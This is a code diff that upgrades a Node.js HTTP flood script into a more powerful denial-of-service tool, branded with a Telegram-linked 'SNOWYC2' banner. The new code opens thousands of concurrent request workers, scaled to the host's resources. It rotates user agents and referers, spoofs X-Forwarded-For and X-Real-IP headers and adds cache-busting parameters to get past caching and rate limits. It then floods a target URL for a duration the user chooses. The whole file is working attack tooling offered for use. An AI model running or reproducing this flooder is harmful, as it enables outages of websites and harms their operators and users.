@@ -1,87 +1,208 @@
-const https = require('https'); // Use HTTPS module for secure connections
-const http = require('http'); // HTTP module in case it's an HTTP connection
+const axios = require('axios');
 const fs = require('fs');
+const os = require('os');
+const http = require('http');
+const https = require('https');
+const process = require('process');
 
-// Load User-Agent from a file (ua.txt)
-const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
+const REQUEST_TIMEOUT = 8000;
 
-// Stats
-let totalRequests = 0;
-let successfulRequests = 0;
-let failedRequests = 0;
-
-// Random User-Agent picker
-function getRandomUserAgent() {
-  return userAgents[Math.floor(Math.random() * userAgents.length)];
+// Function to load lines from a file
+function loadLines(filename) {
+    try {
+        return fs.readFileSync(filename, 'utf8')
+            .split('\n')
+            .map(line => line.trim())
+            .filter(line => line.length > 0);
+    } catch {
+        return [];
+    }
 }
 
-// Basic headers to make the request look like it's from a real browser
-function getHeaders() {
-  return {
-    'User-Agent': getRandomUserAgent(),
-    'Accept': '*/*',
-    'Connection': 'keep-alive',
-    'Cache-Control': 'no-cache',
-  };
+const REFERERS = loadLines('refs.txt');
+const USER_AGENTS = loadLines('ua.txt');
+
+// Random User-Agent Pool
+const UA_POOL = Array.from({ length: 10000 }, () =>
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
+
+// HTTP and HTTPS Keep-Alive agents
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
+
+// Function to dynamically calculate MAX_CONCURRENT based on system resources
+function calculateMaxConcurrent() {
+    const loadAverage = os.loadavg()[0]; // 1-minute load average
+    const freeMemory = os.freemem();
+    const totalMemory = os.totalmem();
+    const memoryThreshold = totalMemory * 0.75;
+    const loadFactor = (loadAverage < 1.5) ? 1 : 0.5;
+    const memoryFactor = freeMemory > memoryThreshold ? 1 : 0.5;
+
+    const baseConcurrent = os.cpus().length * 154;
+    const maxConcurrent = Math.min(baseConcurrent, 3940);
+
+    // Scale based on CPU load and memory
+    return Math.floor(maxConcurrent * loadFactor * memoryFactor);
 }
 
-// Send the request (supports both HTTP and HTTPS)
-function sendRequest(target) {
-  const protocol = target.startsWith('https://') ? https : http; // Choose the right protocol
-  const options = {
-    hostname: target.replace(/^https?:\/\//, ''), // Strip out any 'http://' or 'https://' from the URL
-    port: protocol === https ? 443 : 80, // Choose the correct port based on protocol
-    path: '/',
-    method: 'GET',
-    headers: getHeaders(),
-  };
-
-  const req = protocol.request(options, (res) => {
-    if (res.statusCode >= 200 && res.statusCode < 400) {
-      successfulRequests++;
-    } else {
-      failedRequests++;
+class AttackEngine {
+    constructor(target, duration) {
+        this.target = target;
+        this.duration = duration * 1000;
+        this.startTime = Date.now();
+        this.stats = {
+            total: 0,
+            success: 0,
+            errors: 0,
+            peakRps: 0
+        };
+        this.uaIndex = 0;
+        this.running = true;
     }
 
-    totalRequests++;
-  });
+    // Get random User-Agent
+    getRandomUA() {
+        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
+        return UA_POOL[this.uaIndex];
+    }
 
-  req.on('error', (error) => {
-    failedRequests++;
-    totalRequests++;
-    console.error(`[Error] Request failed: ${error.message}`);
-  });
+    // Get random Referer
+    getRandomReferer() {
+        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
+    }
 
-  req.end();
+    // Make HTTP request
+    async makeRequest() {
+        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
+        const headers = {
+            'User-Agent': this.getRandomUA(),
+            'Referer': this.getRandomReferer(),
+            'X-Forwarded-For': randomIP,
+            'X-Real-IP': randomIP,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        };
+
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
+
+        try {
+            const response = await axios.get(urlWithNoise, {
+                headers,
+                timeout: REQUEST_TIMEOUT,
+                httpAgent: keepAliveHttp,
+                httpsAgent: keepAliveHttps,
+                validateStatus: null
+            });
+            if (response.status === 200) {
+                this.stats.success++;
+                return;
+            }
+        } catch {
+            // ignored
+        }
+
+        this.stats.errors++;
+    }
+
+    // Start the workers
+    async startWorkers() {
+        const workers = [];
+        for (let i = 0; i < calculateMaxConcurrent(); i++) {  // Dynamic scaling
+            workers.push(this.workerLoop());
+        }
+        await Promise.all(workers);
+    }
+
+    // Worker loop for making requests
+    async workerLoop() {
+        while (this.running && Date.now() - this.startTime < this.duration) {
+            this.stats.total++;
+            await this.makeRequest();
+        }
+    }
+
+    // Run the attack
+    async runAttack() {
+        const showIntro = () => {
+            console.clear();
+            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
+            console.log('  ============================================');
+            console.log(`  TARGET: ${this.target}`);
+            console.log(`  TIME:   ${this.duration / 1000}s`);
+            console.log(`  MODE:   RAPID STRIKE - ${calculateMaxConcurrent()} Concurrent`);
+            console.log('  ============================================\n');
+        };
+
+        showIntro();
+
+        let lastTotal = 0;
+        const printStats = setInterval(() => {
+            const elapsed = (Date.now() - this.startTime) / 1000;
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
+            lastTotal = this.stats.total;
+            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
+
+            process.stdout.write(
+                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
+            );
+        }, 200);
+
+        await this.startWorkers();
+        this.running = false;
+        clearInterval(printStats);
+        this.printSummary();
+    }
+
+    // Print the summary of the attack
+    printSummary() {
+        const elapsed = (Date.now() - this.startTime) / 1000;
+        const avgRps = this.stats.total / elapsed;
+        console.log('\n\n  ATTACK FINISHED');
+        console.log('  ============================================');
+        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
+        console.log(`  TOTAL:       ${this.stats.total}`);
+        console.log(`  SUCCESS:     ${this.stats.success}`);
+        console.log(`  ERRORS:      ${this.stats.errors}`);
+        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
+        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
+        console.log('  ============================================\n');
+    }
 }
 
-// Log stats every second
-function logStats() {
-  setInterval(() => {
-    console.clear(); // Clear the terminal
-    console.log('SILVERBACK FLOOD');
-    console.log('======================');
-    console.log(`TOTAL REQUESTS: ${totalRequests}`);
-    console.log(`SUCCESSFUL: ${successfulRequests}`);
-    console.log(`FAILED: ${failedRequests}`);
-  }, 1000);
-}
+// Main function
+(async () => {
+    const readline = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
 
-// Start flooding
-function startFlood(target) {
-  if (!target) {
-    console.log('Usage: node flooder.js <target_url>');
-    process.exit(1);
-  }
+    const ask = (q) => new Promise(resolve => readline.question(q, resolve));
 
-  logStats(); // Start logging the stats
+    const targetInput = await ask("TARGET: ");
+    let target = targetInput.trim();
+    if (!target.startsWith("http")) {
+        target = "http://" + target;
+    }
 
-  // Continuously send requests
-  setInterval(() => {
-    sendRequest(target);
-  }, 0); // No interval, just flood non-stop
-}
+    const durationInput = await ask("TIME: ");
+    readline.close();
 
-// Get target from command-line argument and start
-const target = process.argv[2];
-startFlood(target); // Start flooding the target
+    const duration = parseInt(durationInput);
+    if (isNaN(duration)) {
+        console.log("Invalid time input.");
+        return;
+    }
+
+    const engine = new AttackEngine(target, duration);
+    try {
+        await engine.runAttack();
+    } catch (err) {
+        console.error("Attack failed:", err.message);
+    }
+})();
